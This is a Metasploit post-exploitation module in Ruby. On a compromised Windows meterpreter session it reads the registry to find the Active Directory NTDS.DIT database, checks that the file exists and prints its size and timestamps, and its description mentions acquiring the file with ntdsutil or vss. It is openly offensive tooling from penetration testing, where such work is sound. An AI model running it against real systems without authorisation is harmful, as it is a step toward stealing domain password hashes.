##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/windows/priv'
require 'msf/core/post/common'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(update_info(info,
                      'Name'            => "NTDS.DIT Location Module",
                      'Description'     => %q{
                        This module will find the location of the NTDS.DIT file (from the registry), check that it exists
                        and display it on the screen. Useful if you wish to manually acquire the file using ntdsutil or vss.
                       },
                      'License'         => MSF_LICENSE,
                      'Platform'        => ['win'],
                      'SessionTypes'    => ['meterpreter'],
                      'Author'          => ['Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>']
                     ))
  end

  def run
    # Find the NTDS.DIT location in the registry
    ntds = registry_getvaldata("HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters", "DSA Database file").to_s
    unless ntds
      print_error("Unable to find the NTDS.DIT location.")
      return
    end

    if file?(ntds)
      f = client.fs.file.stat(ntds)
      print_line("NTDS.DIT is located at: #{ntds}")
      print_line("      Size: #{f.size} bytes")
      print_line("   Created: #{f.ctime}")
      print_line("  Modified: #{f.mtime}")
      print_line("  Accessed: #{f.atime}")
    else
      print_error("NTDS.DIT is reportedly located at '#{ntds}' but the file does not appear to exist")
    end
  end
end
